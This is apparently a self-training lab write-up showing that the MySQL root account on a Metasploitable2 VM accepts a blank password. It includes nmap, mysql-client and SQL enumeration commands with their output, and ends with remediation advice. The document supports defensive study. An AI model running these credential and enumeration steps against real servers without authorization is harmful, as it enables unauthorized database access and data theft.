# Metasploitable2 — MySQL Blank Root Password (Credential Misconfiguration)

**Target:** 192.168.109.131 (Metasploitable2, isolated lab VM)
**Attacker host:** Kali Linux
**Environment:** Personal, isolated virtual lab — authorized self-practice only

---

## 1. Objective

Identify the MySQL service running on the target, test for weak or
default credentials, and assess the impact of any unauthorized
database access obtained.

## 2. Scope

- Service/version detection on the MySQL port (3306)
- Authentication testing using default/blank credentials
- Enumeration of accessible databases and user accounts
- Impact assessment

## 3. Tools Used

Nmap, MySQL/MariaDB client

## 4. Methodology

1. Confirm the service and version via Nmap
2. Attempt authentication as `root` with no password
3. If successful, enumerate available databases
4. Enumerate the MySQL user table to identify the root cause
5. Assess impact and document remediation

## 5. Reconnaissance

### Command
```
nmap -sV -p 3306 192.168.109.131
```

### Result
```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
```

## 6. Authentication Testing

### Command
```
mysql -h 192.168.109.131 -u root --skip-ssl
```

**Note:** the modern MySQL client defaults to negotiating TLS, which
this legacy 2008-era server does not support, producing a
`TLS/SSL error: wrong version number`. Adding `--skip-ssl` (or
`--ssl-mode=DISABLED` on newer clients) resolves this and allows a
plaintext connection attempt.

### Result
```
Welcome to the MariaDB monitor.
Server version: 5.0.51a-3ubuntu5 (Ubuntu)
MySQL [(none)]>
```

**Authentication succeeded as `root` with no password supplied at
all.**

## 7. Impact — Database Enumeration

### Command
```sql
show databases;
```

### Result
```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dvwa               |
| metasploit         |
| mysql              |
| owasp10             |
| tikiwiki            |
| tikiwiki195         |
+--------------------+
```

Full read/write access obtained to all 7 databases on the server,
including application databases (`dvwa`, `owasp10`, `tikiwiki`) that
would contain application data in a production equivalent.

## 8. Root Cause — User Table Enumeration

### Command
```sql
select user, host, password from mysql.user;
```

### Result
```
+------------------+------+----------+
| user             | host | password |
+------------------+------+----------+
| debian-sys-maint |      |          |
| root             | %    |          |
| guest            | %    |          |
+------------------+------+----------+
```

All three accounts have **blank passwords**. Critically, `root` is
permitted to connect from `%` (any host), meaning any device on the
network — not just localhost — can authenticate as full database
administrator with zero credentials.

## 9. Risk Review

- Complete, unauthenticated administrative access to every database
  on the server
- `root` account not host-restricted, exposing this to the entire
  network rather than just the local machine
- An attacker could read, modify, or delete any data, create new
  privileged accounts, or use `LOAD_FILE`/`INTO OUTFILE` primitives
  for further filesystem access depending on server configuration
- This is a process/configuration failure rather than a software bug
  — no patch fixes this, only correct account hardening

## 10. Recommendation

- Set a strong password for the `root` MySQL account immediately
- Restrict `root` to `localhost` only; never allow `root@%`
- Remove or disable the `guest` account entirely — it should not exist
- Set a strong password for `debian-sys-maint` or restrict its host
- Apply the principle of least privilege: application-specific
  accounts should have access only to their own database, not global
  admin rights
- Enforce a credential policy in deployment scripts/images so default
  installs are never shipped with blank passwords

---

*This assessment was performed entirely within a personal, isolated
lab environment (Metasploitable2 + Kali Linux) for self-training
purposes.*
